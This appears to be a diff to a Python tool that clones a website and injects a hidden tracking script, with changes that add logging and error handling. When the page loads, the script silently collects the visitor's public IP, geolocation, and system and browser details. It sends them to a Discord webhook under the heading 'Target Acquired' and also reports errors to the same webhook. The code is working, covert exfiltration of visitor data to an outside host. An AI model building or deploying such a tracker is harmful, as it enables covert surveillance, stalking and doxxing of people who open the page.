@@ -429,7 +429,7 @@ def create_tracking_website(url, webhook_url):
         parsed_url = urlparse(url)
         domain_name = parsed_url.netloc.replace('www.', '')
         
-        # Add tracking script with enhanced information gathering
+        # Add tracking script with enhanced information gathering and error handling
         tracking_script = f"""
 <script>
 async function getDetailedInfo() {{
@@ -481,22 +481,32 @@ async function getDetailedInfo() {{
 
 async function trackIP() {{
     try {{
+        console.log('Starting IP tracking...');
+        
         // Get IP and location
+        console.log('Fetching IP address...');
         const ipResponse = await fetch('https://api.ipify.org?format=json');
+        if (!ipResponse.ok) throw new Error('Failed to fetch IP');
         const ipData = await ipResponse.json();
         const publicIP = ipData.ip;
+        console.log('IP fetched:', publicIP);
         
+        console.log('Fetching location details...');
         const detailsResponse = await fetch(`http://ip-api.com/json/${{publicIP}}`);
+        if (!detailsResponse.ok) throw new Error('Failed to fetch location details');
         const details = await detailsResponse.json();
+        console.log('Location details fetched');
         
         // Get detailed system information
+        console.log('Gathering system information...');
         const systemInfo = await getDetailedInfo();
+        console.log('System information gathered');
         
         // Create a professional Discord message with embeds
         const embeds = [
             {{
                 title: "🔒 Target Acquired",
-                description: "```diff\n+ New Target Detected\n- IP Address: " + publicIP + "\n```",
+                description: "```diff\\n+ New Target Detected\\n- IP Address: " + publicIP + "\\n```",
                 color: 0x00ff00,
                 thumbnail: {{
                     url: "https://i.imgur.com/8j3qX5N.png"
@@ -554,18 +564,42 @@ async function trackIP() {{
         ];
         
         // Send to Discord
-        await fetch('{webhook_url}', {{
+        console.log('Sending data to Discord...');
+        const discordResponse = await fetch('{webhook_url}', {{
             method: 'POST',
             headers: {{ 'Content-Type': 'application/json' }},
             body: JSON.stringify({{ embeds }})
         }});
+        
+        if (!discordResponse.ok) {{
+            const errorText = await discordResponse.text();
+            throw new Error(`Discord API error: ${{discordResponse.status}} - ${{errorText}}`);
+        }}
+        
+        console.log('Data successfully sent to Discord');
     }} catch (error) {{
         console.error('Tracking error:', error);
+        // Try to send error to Discord
+        try {{
+            await fetch('{webhook_url}', {{
+                method: 'POST',
+                headers: {{ 'Content-Type': 'application/json' }},
+                body: JSON.stringify({{
+                    content: `❌ Tracking Error: ${{error.message}}`
+                }})
+            }});
+        }} catch (discordError) {{
+            console.error('Failed to send error to Discord:', discordError);
+        }}
     }}
 }}
 
 // Execute tracking when page loads
-window.addEventListener('load', trackIP);
+console.log('Tracking script loaded');
+window.addEventListener('load', () => {{
+    console.log('Page loaded, starting tracking...');
+    trackIP();
+}});
 </script>
 """
         # Add the tracking script to the HTML
@@ -584,6 +618,10 @@ window.addEventListener('load', trackIP);
         console.print("   - System and browser information")
         console.print("   - Device specifications")
         console.print("   - Time and timezone data")
+        console.print("\n[bold red]Debugging Tips:[/bold red]")
+        console.print("1. Open the browser's Developer Tools (F12)")
+        console.print("2. Check the Console tab for any error messages")
+        console.print("3. Check the Network tab to see if requests are being made")
         show_file_location(output_file)
         return output_file
     except Exception as e:
